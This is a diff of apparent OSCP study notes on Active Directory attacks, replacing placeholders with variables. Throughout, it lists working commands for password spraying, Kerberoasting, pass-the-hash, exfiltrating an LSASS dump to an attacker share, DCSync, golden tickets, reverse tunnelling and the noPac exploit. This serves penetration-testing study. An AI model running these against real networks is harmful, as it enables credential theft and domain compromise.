@@ -40,7 +40,7 @@ Get-NetComputer
 Get-NetComputer | select operatingsystem,dnshostname
 
 # SMB enumeration
-crackmapexec smb <target> -u user -p password --shares
+crackmapexec smb $BoxIP -u user -p password --shares
 ```
 
 #### Step 3.5: Domain Shares & SYSVOL
@@ -76,16 +76,16 @@ Full reference: [[22. Active Directory Introduction and Enumeration#22.3.5 Enume
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
 
 # SetSPN
-setspn -L <user>
+setspn -L $Username
 ```
 
 #### Step 5: Active Sessions & Local Admin
 ```powershell
 Find-LocalAdminAccess    # sprays every machine in domain via SCM OpenServiceW — noisy, generates events
-Get-NetSession -ComputerName <target>    # blocked on Win10 1709+/Server 2019+ for non-admins by default
+Get-NetSession -ComputerName $BoxIP    # blocked on Win10 1709+/Server 2019+ for non-admins by default
 
 # PsLoggedOn (requires Remote Registry service on target — enabled by default on servers, disabled on workstations)
-.\PsLoggedon.exe \\<target>
+.\PsLoggedon.exe \\$BoxIP
 ```
 
 > Key lesson: on modern Windows, `Get-NetSession` returns Access Denied rather than sessions. Use `-Verbose` to distinguish "no sessions" from "access denied". Use PsLoggedOn as the fallback.
@@ -96,7 +96,7 @@ Get-NetSession -ComputerName <target>    # blocked on Win10 1709+/Server 2019+ f
 
 #### Step 6: Permissions
 ```powershell
-Get-ObjectAcl -Identity <user>
+Get-ObjectAcl -Identity $Username
 Find-InterestingDomainAcl
 ```
 
@@ -106,7 +106,7 @@ Find-InterestingDomainAcl
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\
 
 # Or use SharpHound.exe
-SharpHound.exe -c All -d domain.com
+SharpHound.exe -c All -d $Domain
 
 # Import to BloodHound on Kali
 # Start Neo4j
@@ -144,7 +144,7 @@ RETURN p2
 **bloodhound-python — Remote collection from Kali (no WinRM/RDP needed):**
 ```bash
 pip3 install bloodhound
-bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns <DC_IP> -c all
+bloodhound-python -d $Domain -u user -p pass -ns $BoxIP -c all
 zip -r bh_data.zip *.json   # then import zip into BloodHound GUI
 ```
 
@@ -152,7 +152,7 @@ zip -r bh_data.zip *.json   # then import zip into BloodHound GUI
 
 ```powershell
 # Get current user's SID
-$sid = Convert-NameToSid <username>
+$sid = Convert-NameToSid $Username
 
 # Find ACEs where the current user has interesting rights on other objects
 # -ResolveGUIDs translates GUIDs to human-readable names (always use this)
@@ -160,7 +160,7 @@ Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $si
 # Key fields: ObjectDN, AceType, ActiveDirectoryRights, ObjectAceType
 
 # Scope to a specific OU to avoid timing out on large domains
-Get-DomainObjectACL -ResolveGUIDs -Identity * -domain DOMAIN.LOCAL \
+Get-DomainObjectACL -ResolveGUIDs -Identity * -domain $Domain \
   -SearchBase "LDAP://OU=Users,DC=DOMAIN,DC=LOCAL"
 ```
 
@@ -200,7 +200,7 @@ Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD
 
 ```cmd
 :: From domain-joined Windows machine (domain-aware share crawl)
-Snaffler.exe -d DOMAIN.LOCAL -s -v data
+Snaffler.exe -d $Domain -s -v data
 ```
 
 Full reference: [[16. Password Attacks|PA.17.4]] (per-host), [[22. Active Directory Introduction and Enumeration|AD.7.2]] (domain-wide)
@@ -217,9 +217,9 @@ If you don't have a confirmed username list yet, generate candidates first:
 username-anarchy -i names.txt > candidate_users.txt
 
 # Validate candidates against Kerberos WITHOUT triggering lockouts
-kerbrute userenum -d <domain> --dc <DC-IP> candidate_users.txt
+kerbrute userenum -d $Domain --dc $BoxIP candidate_users.txt
 # Also try standard wordlists:
-kerbrute userenum -d <domain> --dc <DC-IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+kerbrute userenum -d $Domain --dc $BoxIP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 ```
 Valid usernames returned by kerbrute (Kerberos says "pre-auth required" vs "no such user") are safe to spray.
 
@@ -233,11 +233,11 @@ Full reference: [[16. Password Attacks|PA.20]], [[16. Password Attacks|PA.21]]
 
 ```bash
 # From Linux, authenticated
-crackmapexec smb <DC_IP> -u user -p pass --pass-pol
+crackmapexec smb $BoxIP -u user -p pass --pass-pol
 # → [+] Minimum password length: 8 | Lockout threshold: 5 attempts
 
 # From Linux, rpcclient
-rpcclient -U "DOMAIN\\user%pass" <DC_IP> -c "getdompwinfo"
+rpcclient -U "DOMAIN\\user%pass" $BoxIP -c "getdompwinfo"
 # → minPasswordLength: 8
 
 # From Windows, PowerView
@@ -264,14 +264,14 @@ Crack captures with `hashcat -m 5600`. Full reference: [[22. Active Directory In
 **Password Spraying**:
 ```bash
 # CrackMapExec / NetExec
-crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success
-nxc smb <target> -u users.txt -p 'Password123!' --continue-on-success
+crackmapexec smb $BoxIP -u users.txt -p passwords.txt --continue-on-success
+nxc smb $BoxIP -u users.txt -p '$Password' --continue-on-success
 
 # Kerbrute (Kerberos — faster, less log noise than SMB spray)
-kerbrute passwordspray -d domain.com --dc <dc_ip> users.txt "Password123!"
+kerbrute passwordspray -d $Domain --dc $BoxIP users.txt "$Password"
 
 # Hydra (for RDP/WinRM where Kerberos isn't the auth path)
-hydra -L users.txt -P rockyou.txt rdp://<target> -t 1
+hydra -L users.txt -P rockyou.txt rdp://$BoxIP -t 1
 ```
 
 **From Windows foothold — Spray-Passwords.ps1 (LDAP/ADSI — low noise):**
@@ -297,7 +297,7 @@ Full reference: [[22. Active Directory Introduction and Enumeration|AD.5]], [[23
 Rubeus.exe asreproast /nowrap
 
 # impacket
-impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast domain.com/user
+impacket-GetNPUsers -dc-ip $BoxIP -request -outputfile hashes.asreproast $Domain/user
 
 # Crack
 hashcat -m 18200 hashes.asreproast rockyou.txt --force
@@ -309,37 +309,37 @@ hashcat -m 18200 hashes.asreproast rockyou.txt --force
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast /nowrap
 
 # impacket (from Kali — preferred when evil-winrm is your only shell)
-impacket-GetUserSPNs -request -dc-ip <dc_ip> domain.com/user -outputfile hashes.kerberoast
+impacket-GetUserSPNs -request -dc-ip $BoxIP $Domain/user -outputfile hashes.kerberoast
 
 # Crack
 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
 ```
 
-> Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW`, `sudo timedatectl set-ntp false` → `sudo ntpdate <DC_IP>` → reconnect VPN immediately (large offset kills the OpenVPN TLS session) → run impacket. See [[16. Password Attacks#Kerberos Clock Sync|Kerberos clock sync procedure in M16]].
+> Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW`, `sudo timedatectl set-ntp false` → `sudo ntpdate $BoxIP` → reconnect VPN immediately (large offset kills the OpenVPN TLS session) → run impacket. See [[16. Password Attacks#Kerberos Clock Sync|Kerberos clock sync procedure in M16]].
 >
 > Rubeus over evil-winrm fails with "No credentials are available in the security package", evil-winrm authenticates via NTLM so there's no Kerberos TGT in the session. Use impacket from Kali instead.
 
 #### Step 5: Pass-the-Hash
 ```bash
 # impacket
-impacket-psexec -hashes :<ntlm_hash> domain/user@<target>
-impacket-wmiexec -hashes :<ntlm_hash> domain/user@<target>
+impacket-psexec -hashes :$AdminHash domain/user@$BoxIP
+impacket-wmiexec -hashes :$AdminHash domain/user@$BoxIP
 
 # CrackMapExec / NetExec
-crackmapexec smb <target> -u user -H <ntlm_hash>
-nxc smb <target> -u user -H <ntlm_hash>
+crackmapexec smb $BoxIP -u user -H $AdminHash
+nxc smb $BoxIP -u user -H $AdminHash
 
 # smbclient
-smbclient \\\\<target>\\share -U user --pw-nt-hash <ntlm_hash>
+smbclient \\\\$BoxIP\\share -U user --pw-nt-hash $AdminHash
 
 # RDP (requires DisableRestrictedAdmin=0 on target)
-xfreerdp /v:<target> /u:user /pth:<ntlm_hash>
+xfreerdp /v:$BoxIP /u:user /pth:$AdminHash
 ```
 
 #### Step 6: Overpass-the-Hash
 ```cmd
 # Mimikatz
-sekurlsa::pth /user:user /domain:domain.com /ntlm:<ntlm_hash> /run:powershell
+sekurlsa::pth /user:user /domain:$Domain /ntlm:$AdminHash /run:powershell
 
 # In new PowerShell session
 net use \\fileserver
@@ -350,16 +350,16 @@ net use \\fileserver
 Requires: GenericWrite or WriteProperty on a machine account's `ms-DS-KeyCredentialLink` attribute.
 ```bash
 # 1. Add shadow credential to the machine account
-python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <machine$> --action add
+python3 pywhisker.py -d $Domain -u $Username -p $Password --target <machine$> --action add
 # Note the pfx filename and password printed by pywhisker
 
 # 2. Get TGT via PKINIT (oscrypto pin may be needed first: pip3 install oscrypto==1.3.0)
-python3 gettgtpkinit.py <domain>/<machine$> out.ccache -cert-pfx <pfx-file> -pfx-pass <pfx-pass>
+python3 gettgtpkinit.py $Domain/<machine$> out.ccache -cert-pfx $BoxDir -pfx-pass $Password
 
 # 3. Use the TGT
 export KRB5CCNAME=out.ccache
-evil-winrm -i <target> -r <domain>         # WinRM
-smbclient -k -N //<target>/share           # SMB with Kerberos
+evil-winrm -i $BoxIP -r $Domain         # WinRM
+smbclient -k -N //$BoxIP/share           # SMB with Kerberos
 ```
 Full reference: [[16. Password Attacks|PA.17]], [[Secrets & Credentials (Decision Tree)#Got write access to an AD computer object|Decision Tree]]
 
@@ -388,38 +388,38 @@ rundll32 C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dm
 
 # Exfil to Kali via authenticated SMBserver:
 # (Kali)   impacket-smbserver share /tmp/share -smb2support -username kali -password kali
-# (Target) net use \\<KALI>\share /user:kali kali
-#          copy C:\Windows\Temp\lsass.dmp \\<KALI>\share\lsass.dmp
+# (Target) net use \\$LocalIP\share /user:kali kali
+#          copy C:\Windows\Temp\lsass.dmp \\$LocalIP\share\lsass.dmp
 ```
 ```bash
 # Parse offline on Kali:
 pypykatz lsa minidump /tmp/share/lsass.dmp
-# Look for: username + NT: <hash> + password: <cleartext>
+# Look for: username + NT: $AdminHash + password: <cleartext>
 ```
 See [[Active Directory (Breakdowns)#rundll32 comsvcs.dll MiniDump]], [[Active Directory (Decision Tree)#I have SYSTEM on a Windows target but Meterpreter kiwi / sekurlsa::logonpasswords is killed by Defender]], and [[27. Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1|Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1]] for the full hands-on walkthrough.
 
 **DCSync (domain-level — requires DA or DCSync rights)**:
 ```cmd
-lsadump::dcsync /domain:DOMAIN.LOCAL /user:domain\krbtgt
-lsadump::dcsync /domain:DOMAIN.LOCAL /user:domain\administrator
+lsadump::dcsync /domain:$Domain /user:domain\krbtgt
+lsadump::dcsync /domain:$Domain /user:domain\administrator
 # RID 500 in output = genuine built-in Administrator account
 ```
 
 **Hash Dumping**:
 ```bash
 # impacket (remote)
-impacket-secretsdump domain/user:password@<dc_ip>
+impacket-secretsdump domain/user:password@$BoxIP
 impacket-secretsdump -sam sam.bak -security security.bak -system system.bak LOCAL
 
 # NetExec one-liners (no shell needed, just creds)
-nxc smb <target> -u user -p pass --sam
-nxc smb <target> -u user -p pass --lsa
-nxc smb <dc_ip>  -u user -p pass --ntds
+nxc smb $BoxIP -u user -p pass --sam
+nxc smb $BoxIP -u user -p pass --lsa
+nxc smb $BoxIP  -u user -p pass --ntds
 ```
 
 **Snaffler** (share and file credential hunting, run from domain-joined machine):
 ```cmd
-.\Snaffler.exe -d <domain> -o snaffler_output.log -v data
+.\Snaffler.exe -d $Domain -o snaffler_output.log -v data
 ```
 Finds credentials in readable shares: configs, scripts, backup files, .git repos, etc.
 
@@ -454,11 +454,11 @@ ls -la /tmp/krb5cc_*
 export KRB5CCNAME=/tmp/krb5cc_<id>
 
 # Or extract from a .keytab
-python3 keytabextract.py <file.keytab>
-kinit <user>@DOMAIN -k -t <file.keytab>
+python3 keytabextract.py $BoxDir
+kinit $Username@DOMAIN -k -t $BoxDir
 
 # Use it
-smbclient -k -N //<target>/share
+smbclient -k -N //$BoxIP/share
 ```
 Full reference: [[16. Password Attacks|PA.15]], [[16. Password Attacks|PA.16]]
 
@@ -468,7 +468,7 @@ Full reference: [[16. Password Attacks|PA.15]], [[16. Password Attacks|PA.16]]
 lsadump::dcsync /user:domain\krbtgt
 
 # Create golden ticket
-kerberos::golden /user:<user> /domain:domain.com /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt
+kerberos::golden /user:$Username /domain:$Domain /sid:$Domain /krbtgt:$AdminHash /ptt
 
 # Access DC
 PsExec \\dc1 cmd
@@ -477,7 +477,7 @@ PsExec \\dc1 cmd
 #### Step 4: Silver Ticket
 ```cmd
 # Create service ticket
-kerberos::golden /user:<user> /domain:domain.com /sid:<domain_sid> /target:<server.domain.com> /service:<service> /rc4:<service_hash> /ptt
+kerberos::golden /user:$Username /domain:$Domain /sid:$Domain /target:$FQDN /service:$BoxName /rc4:$AdminHash /ptt
 
 # Access service
 iwr -UseDefaultCredentials http://<server>
@@ -502,30 +502,30 @@ aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:po
 
 **PsExec**:
 ```cmd
-PsExec64.exe \\<target> -u domain\user -p password cmd
+PsExec64.exe \\$BoxIP -u domain\user -p password cmd
 ```
 
 **WMI**:
 ```cmd
-wmic /node:<target> /user:domain\user /password:pass process call create "cmd.exe /c whoami > C:\temp\out.txt"
+wmic /node:$BoxIP /user:domain\user /password:pass process call create "cmd.exe /c whoami > C:\temp\out.txt"
 ```
 
 **PowerShell Remoting**:
 ```powershell
 $cred = Get-Credential
-Enter-PSSession -ComputerName <target> -Credential $cred
+Enter-PSSession -ComputerName $BoxIP -Credential $cred
 ```
 
 **WinRM**:
 ```cmd
-winrs -r:<target> -u:user -p:pass "whoami"
-evil-winrm -i <target> -u user -p password
+winrs -r:$BoxIP -u:user -p:pass "whoami"
+evil-winrm -i $BoxIP -u user -p password
 ```
 
 **Impacket**:
 ```bash
-impacket-psexec domain/user:password@<target>
-impacket-wmiexec domain/user:password@<target>
+impacket-psexec domain/user:password@$BoxIP
+impacket-wmiexec domain/user:password@$BoxIP
 ```
 
 #### Step 2: Pivoting
@@ -560,7 +560,7 @@ run -j
 ./chisel server --port 8080 --reverse
 
 # Client
-./chisel client <attacker_ip>:8080 R:socks
+./chisel client $LocalIP:8080 R:socks
 ```
 
 **Proxychains**:
@@ -588,11 +588,11 @@ $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $pas
 
 # ForceChangePassword ACE: reset target's password
 $newPass = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
-Set-DomainUserPassword -Identity <target_user> -AccountPassword $newPass -Credential $Cred -Verbose
+Set-DomainUserPassword -Identity $Username -AccountPassword $newPass -Credential $Cred -Verbose
 
 # GenericAll/Self-Membership ACE: add user to a group
-$Cred2 = New-Object System.Management.Automation.PSCredential('DOMAIN\<target_user>', $newPass)
-Add-DomainGroupMember -Identity 'Privileged Group' -Members '<target_user>' -Credential $Cred2 -Verbose
+$Cred2 = New-Object System.Management.Automation.PSCredential('DOMAIN\$Username', $newPass)
+Add-DomainGroupMember -Identity 'Privileged Group' -Members '$Username' -Credential $Cred2 -Verbose
 
 # GenericWrite/GenericAll ACE: set SPN for targeted Kerberoasting
 Set-DomainObject -Credential $Cred2 -Identity <high_value_user> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
@@ -612,7 +612,7 @@ runas /netonly /user:DOMAIN\user "cmd.exe"
 
 Then inside the new cmd, run mimikatz:
 ```mimikatz
-lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\krbtgt
+lsadump::dcsync /domain:$Domain /user:DOMAIN\krbtgt
 ```
 
 For accounts with reversible encryption (ENCRYPTED_TEXT_PWD_ALLOWED), cleartext appears in DCSync output.
@@ -629,7 +629,7 @@ Get-DomainTrustMapping
 # Shows: SourceName, TargetName, TrustType (WITHIN_FOREST/FOREST_TRANSITIVE), TrustDirection
 
 # Windows built-in
-netdom query /domain:DOMAIN.LOCAL trust
+netdom query /domain:$Domain trust
 ```
 
 Trust types:
@@ -644,7 +644,7 @@ From a compromised child domain:
 Get-DomainSID   # → S-1-5-21-CHILD...
 
 # Get Enterprise Admins SID from parent
-Get-DomainObject -Identity "Enterprise Admins" -Domain PARENT.DOMAIN.LOCAL
+Get-DomainObject -Identity "Enterprise Admins" -Domain PARENT.$Domain
 # → ObjectSID: S-1-5-21-PARENT...-519
 ```
 
@@ -655,7 +655,7 @@ lsadump::dcsync /user:CHILD\krbtgt
 
 ```cmd
 rem Forge golden ticket with ExtraSids (parent Enterprise Admins SID injected)
-.\Rubeus.exe golden /rc4:<CHILD_KRBTGT_HASH> /domain:CHILD.PARENT.LOCAL ^
+.\Rubeus.exe golden /rc4:$AdminHash /domain:CHILD.PARENT.LOCAL ^
   /sid:<CHILD_DOMAIN_SID> /sids:<ENTERPRISE_ADMINS_SID> /user:hacker /ptt
 klist
 rem Verify: ls \\parentdc.parent.local\c$
@@ -679,7 +679,7 @@ rem Windows: Rubeus with /domain: for external forest
 
 ```bash
 # Linux: GetUserSPNs.py with -target-domain
-GetUserSPNs.py -target-domain FOREIGN.FOREST.LOCAL OUROWN.LOCAL/user:pass -dc-ip <DC_IP> -request
+GetUserSPNs.py -target-domain FOREIGN.FOREST.LOCAL OUROWN.LOCAL/user:pass -dc-ip $BoxIP -request
 # Crack with hashcat -m 13100
 # Use cracked credentials: smbexec.py FOREIGN.FOREST.LOCAL/user:pass@<foreign_dc_ip>
 ```
@@ -695,10 +695,10 @@ Full reference: [[22. Active Directory Introduction and Enumeration|AD.18]], [[2
 Any low-priv domain user can impersonate a DC and get SYSTEM:
 ```bash
 # Scan first
-python3 scanner.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -use-ldap
+python3 scanner.py $Domain/user:pass -dc-ip $BoxIP -use-ldap
 
 # Exploit
-python3 noPac.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -use-ldap \
+python3 noPac.py $Domain/user:pass -dc-ip $BoxIP -use-ldap \
   -shell --impersonate administrator
 ```
 
@@ -740,3 +740,14 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" |
 - [HackTricks - DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
 - [Impacket GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
 - [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/22. Active Directory Introduction and Enumeration]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
